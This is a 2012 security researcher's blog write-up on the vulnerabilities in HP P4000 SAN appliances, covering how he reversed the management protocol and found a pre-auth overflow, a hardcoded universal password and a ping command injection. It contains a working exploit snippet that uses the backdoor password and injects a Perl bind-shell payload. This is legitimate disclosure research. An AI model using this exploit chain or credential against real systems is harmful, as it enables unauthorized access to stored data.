---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2012-02-17_compromising-hp-san-appliances.md
original_filename: 2012-02-17_compromising-hp-san-appliances.md
title: Compromising HP SAN appliances
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: fe2624d870f94969636dd0cabce51f72f1c059b2fe3fe2014235d82a81154fc9
text_sha256: 6e51ce4e4c4449254ad2d4997dafe1dc34815767f4935de9d7528b067b81cd81
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Compromising HP SAN appliances

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2012-02-17_compromising-hp-san-appliances.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `fe2624d870f94969636dd0cabce51f72f1c059b2fe3fe2014235d82a81154fc9`
- Text SHA256: `6e51ce4e4c4449254ad2d4997dafe1dc34815767f4935de9d7528b067b81cd81`


## Content

---
title: "Compromising HP SAN appliances"
page_title: "Compromising HP SAN appliances | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2012/02/17/compromising_hp_san_appliances/index.html"
final_url: "https://www.agarri.fr/blog/archives/2012/02/17/compromising_hp_san_appliances/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["HP"]
bugs: ["Hardcoded credentials", "Reverse engineering", "Buffer Overflow"]
publication_date: "2012-02-17"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6417
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2012](https://www.agarri.fr/blog/archives/2012/index.html) > [02](https://www.agarri.fr/blog/archives/2012/02/index.html) >  
[<](https://www.agarri.fr/blog/archives/2011/11/26/regarding_vmsa-2011-0013/index.html) 16:34:01 [>](https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html)

##  vendredi 17 février 2012, 16:34:01 (UTC+0100) 

### Compromising HP SAN appliances

In November 2011, HP [published](http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086) an advisory regarding their "HP StorageWorks P4000 Virtual SAN Appliance". However, these vulnerabilities are located in the "Centralized Management Console" ([CMC](http://h18000.www1.hp.com/products/quickspecs/13552_div/13552_div.html)) daemon which is used in the full "P4000 G2 SAN" range of products (including the P4300, P4500 and P4800 physical SAN devices). This post describes the process followed to identify these vulnerabilities.

  

First, what is this product ? HP VSA is a virtualized SAN infrastructure for VMware ESX or Microsoft Hyper-V environments. VSA consolidates server disk drives and external storage into a single virtual iSCSI SAN. This means that if you compromise the appliance, you also compromise any data stored in the SAN ! Next, where can we find the target software ? HP proposes a full trial version [here](http://h18006.www1.hp.com/products/storage/software/vsa/trial/index.html). My tests were done on version 696_10503. The version now available is 696_10537 (probably safe but untested).

  

We now have a working VM with the HP VSA demo. The first step is to create some administration traffic (on port TCP/1383) using the Windows client, sniff it and try to reverse the protocol in order to later fuzz it. The first packets of the exchange are the following :
  
  
  00000000  00 00 00 01 00 00 00 01  00 00 00 13 00 00 00 13 ........ ........
  00000010  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 00 ........ ........
  00000020  52 65 71 75 65 73 74 20  74 72 61 6e 73 66 6f 72 Request  transfor
  00000030  6d 73 00  ms.
  
  00000000  00 00 00 01 00 00 00 01  00 00 00 19 00 00 00 13 ........ ........
  00000010  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 00 ........ ........
  00000020  52 65 73 70 6f 6e 73 65  20 74 72 61 6e 73 66 6f Response  transfo
  00000030  72 6d 73 3a 20 58 4f 52  00  rms: XOR .
  
  00000033  00 00 00 01 00 00 00 01  00 00 00 13 00 00 00 13 ........ ........
  00000043  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 00 ........ ........
  00000053  4e 65 77 20 74 72 61 6e  73 66 6f 72 6d 3a 20 58 New tran sform: X
  00000063  4f 52 00  OR.
  
  00000039  00 00 00 01 00 00 00 01  00 00 00 15 00 00 00 13 ........ ........
  00000049  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 00 ........ ........
  00000059  4e 65 77 20 74 72 61 6e  73 66 6f 72 6d 20 4f 4b New tran sform OK
  00000069  20 58 4f 52 00  XOR.
  

Based on this small exchange, we can detect a classic structure with a header followed by an ASCIIZ string.

  

We can suppose that the structure of the header is the following :  
\- the first 8 bytes are static : "00 00 00 01 00 00 00 01" (offset 0x00)  
\- the next 4 bytes represent the size of the ASCIIZ string (offset 0x08)  
\- the next 4 bytes are static : "00 00 00 13" (offset 0x0c)  
\- the next 16 bytes are static : "00 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00" (offset 0x10)

  

From this point, the traffic is XOR-encoded :
  
  
  00000066  00 00 00 01 00 00 00 01  00 00 00 35 00 00 00 35 ........ ...5...5
  00000076  00 00 00 00 00 00 00 00  00 00 00 14 00 00 00 00 ........ ........
  00000086  3e 3d 35 3b 3c 68 7d 33  36 3f 3b 3c 7d 30 30 30 >=5;<h}36 ?;<}000
  00000096  30 30 30 30 30 7d 04 37  20 21 3b 3d 3c 72 70 6a 00000}.7  !;=<rpj
  000000A6  7c 67 7c 62 62 70 7e 72  10 27 3b 3e 36 72 70 62 |g|bbp~r. ';>6rpb
  000000B6  61 63 61 70 00  acap.
  
  0000006E  00 00 00 00 00 00 00 01  00 00 00 0a 00 00 00 00 ........ ........
  0000007E  00 00 00 00 00 00 00 00  ff ff ff ff ff ff ff ff ........ ........
  0000008E  1d 19 68 72 1e 3d 35 3b  3c 00  ..hr.=5; <.
  

Note : attentive readers have probably noticed that the format of the headers is now slighlty different, in both request and response. In fact, HP VSA isn't picky at all about the format of the header, as far as the size of the content is exact.

  

In order to go further, we need the XOR key. Given that the first XOR-encoded packet is the login request, we sent a request with a password string of "bbbbbbbb" and looked for a repetitive pattern (see above, from offset 0x66 to 0xBA). Do you see it ?

  

..............

  

OK, we have a string of 8 x "0" (ASCII 0x30) which may match the 8 x "b" (ASCII 0x62) if the key is 1 byte long. Quick calculation : 0x30 ^ 0x62 = 0x52. Let's try to verify it by trying to decode tshark (command-line version of Wireshark) output by piping it to a minimalist Python shell like this one :
  
  
  import sys
  for line in sys.stdin:
  print '++ ',
  print ''.join( [ chr(ord(c) ^ 0x52) for c in line ] ) 
  

And it works ! ;-) We now know that our login request has the following format : "login:/MY_USER/MY_PASSSWD/Version "8.5.0"" and we can code a basic ~~client~~ fuzzer. After a few runs, the target process crashes while parsing overlong passwords. Debugging will reveal that sscanf() is used with fixed-length stack buffers and no length checks. The sscanf() pattern is "/%[^/]/%[^/]/%s %s" with arguments 1, 2 and 3 of size 1024. Argument 4 is smaller (<= 0x50 bytes).

  

A pre-authentication stack-based overflow is already a cool finding, but the disassembly will reveal something much more easy to exploit : hardcoded credentials !

  

This is the vulnerable call to sscanf():

  
![](/docs/sscanf.png)  

The format parameter is stored in the .rodata section, and a very weird string ("L0CAlu53R") is located next to it _and_ used in the same function:

  
![](/docs/constants.png)  

This string is a magic password, working for every account !

  
![](/docs/passwd-check.png)  

Let's recap : we can exploit a pre-auth buffer-overflow and gain OS-level privileges or use the hard-coded password to gain application-level privileges. The easiest way (aka "attacker's path of least resistance") to have both would be to switch from application-level privileges (no memory corruption, 100% reliable) to OS-level privileges with another vulnerability involving manipulation of the file-system or commands execution.

  

So we browsed every part of the Windows client in order to explore every available feature. And we found a "Check connectivity" feature using "ping" without sanitizing the parameters.

  

The command has the following format :
  
  
  get:/lhn/public/network/ping/<field1>/<field2>/
  <field1> : IP address of the interface from which ICMP packets are send
  <field2> : target IP address or hostname
  

  

Given that Perl is installed on the appliance, we use the classic Metasploit payload to bind a shell on port TCP/12345 :
  
  
  def send_Login():
  # BACKDOOR
  data = 'login:/global$agent/L0CAlu53R/Version "8.5.0"'
  send_packet(data)
  
  def send_Exec():
  # METASPLOIT PAYLOAD
  cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,12345,Reuse,1,Listen)->accept; \
  $~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
  
  # COMMAND INJECTION BUG
  data = 'get:/lhn/public/network/ping/127.0.0.1/foobar;' + cmd + '/'
  
  # EXPLOIT
  zprint('Now connect to port 12345 of machine ' + str(HOST))
  send_packet(data)
  

  

Et voilà, mission accomplished ! We fully compromised the SAN appliance, allowing unauthorized acces to every data stored inside. Plausible next moves : reconfigure some interesting [LUN](http://en.wikipedia.org/wiki/Logical_Unit_Number), mount them and steal data (NTLM hashes, configuration files, raw database files, ...). A PoC code is available : [hydragen.py](/docs/hydragen.py).

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2012/02/17/compromising_hp_san_appliances/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
